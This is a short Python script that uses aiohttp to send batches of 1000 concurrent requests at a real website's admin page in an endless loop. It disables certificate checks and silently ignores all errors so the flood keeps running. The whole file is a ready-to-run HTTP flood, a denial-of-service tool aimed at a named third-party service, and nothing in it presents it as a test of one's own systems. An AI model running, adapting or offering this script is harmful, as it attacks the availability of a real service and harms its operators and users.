#!/usr/bin/env python3

import aiohttp
import asyncio
import ssl
# Disable SSL certificate verification
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

url = "https://stackoverflow.com/admin.php?shemmarie"

async def send_request(session):
    async with session.get(url, ssl=ssl_context) as response:
        print("Sent request:", response.status)

async def main():
    concurrency = 1000  # Adjust the concurrency level as needed

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(concurrency):
            tasks.append(send_request(session))
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    print('Hello!')
    while True:
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(main())
        except KeyboardInterrupt:
            break
        except:
            pass
